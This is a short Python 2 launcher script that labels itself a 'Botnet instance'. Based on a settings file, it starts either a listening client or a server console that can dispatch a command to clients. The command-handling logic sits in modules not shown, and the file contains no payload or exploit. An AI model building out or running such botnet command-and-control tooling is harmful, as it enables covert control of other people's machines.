import json
import signal
import sys

import actor
import processor

USAGE="""
Botnet instance.

Usage:
  python main.py client|server|hybrid [-r command]

Options:
  -r   Execute a command and quit

ToDo:
  -p   Run on specific port

"""

MAINPR = processor.MainProcessor
SETFILE = "settings.json"

if __name__ == '__main__':
    try:
        with open(SETFILE,"r") as f:
            settings = json.loads(f.read())
        if sys.argv[1]=='client':
            sole_actor = actor.Actor(targetProcessor=MAINPR,
                         threads=settings['clientThreads'],
                         bind_ip=settings['clientIP'],
                         bind_port=settings['clientPort'])
            signal.pause()
        elif sys.argv[1]=='server':
            if '-r' in sys.argv[2:]:
                command = ' '.join(sys.argv[(sys.argv.index('-r')+1):])
                console = actor.Console(targetProcessor=MAINPR,cmd=command,
                          threads=settings['serverThreads'],
                          bind_ip=settings['serverIP'],
                          bind_port=settings['serverPort'])
            else:
                console = actor.Console(targetProcessor=MAINPR,
                          threads=settings['serverThreads'],
                          bind_ip=settings['serverIP'],
                          bind_port=settings['serverPort'])
                signal.pause()
        elif sys.argv[1]=='hybrid':
            raise NotImplementedError
        else:
            print "Please choose either client or server functionality"
    except IndexError:
        print USAGE
